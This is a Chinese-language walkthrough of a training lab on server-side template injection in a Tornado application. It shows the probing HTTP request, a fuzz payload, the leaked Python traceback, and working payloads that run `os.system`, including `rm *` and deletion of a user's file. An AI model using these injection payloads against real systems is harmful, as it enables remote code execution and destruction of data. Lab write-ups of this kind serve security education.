# 实验：基础服务器端模板注入（代码上下文）

由于不安全地使用 Tornado 模板的方式，本实验存在服务器端模板注入漏洞。为了解决本实验，请查阅 Tornado 文档以了解如何执行任意代码，然后从 Carlos 的主目录中删除 `morale.txt` 文件。

你可以使用以下凭据登录自己的账户：`wiener:peter`

> **提示**
> 仔细查看“首选名称”（preferred name）功能。

## 步骤

探测
- 使用账户页面的首选名称功能
    ```http
    POST /my-account/change-blog-post-author-display HTTP/2

    blog-post-author-display=user.first_name&csrf=WpHfNAVZyAUV3FCxbXAGjkD8K85Xn9x7
    ```
    - 其他选项对应
        - `user.name`
        - `user.nickname`

    - 效果为修改评论显示的名称

    - 兴趣点：请求体参数似乎为对象形式


尝试修改请求体参数值
- 仅设置 `user`
    - 响应无变化，查看评论名称
        ```log
        &amp;lt;__main__.User instance at 0x7f1032b3c0f0&amp;gt;
        ```
    - 确认 post 请求体参数被作为表达式反射到评论名称中

- 设置模糊载荷
    `blog-post-author-display=<@urlencode>{var} ${var} {{var}} <%var%> [% var %]</@urlencode>`
    - 服务器响应
        ```log
        No handlers could be found for logger "tornado.application"
        Traceback (most recent call last):
        File "<string>", line 15, in <module>
        File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 317, in __init__
            "exec", dont_inherit=True)
        File "<string>.generated.py", line 5
            _tt_tmp = var} ${var} {{var  # <string>:1
                        ^
        SyntaxError: invalid syntax
        ```
    - 揭示语言 python 2.7
    - 模板 tornado


查阅文档
- tornado 表达式
    `{{ ... }}`   
    
- python 命令执行
    ```py
    __import__('os').system('ls')
    ```

构造载荷
- 查看目录文件
    `{{ __import__('os').system('ls') }}`
    - 响应
        `morale.txt`

- 删除文件
    `{{ __import__('os').system('rm *') }}`
    - 访问评论页面触发代码执行


示例解决方案
- 载荷 
    `blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')`
    - 对上下文结构使用闭合双花括号
    - 指令标签导入 os 模块
    - 表达式标签调用 os 模块执行系统命令


之前的尝试，实际上在账户名称的末尾额外拥有 `{{0}}`。猜测类似嵌套模板标记或模板标记修复
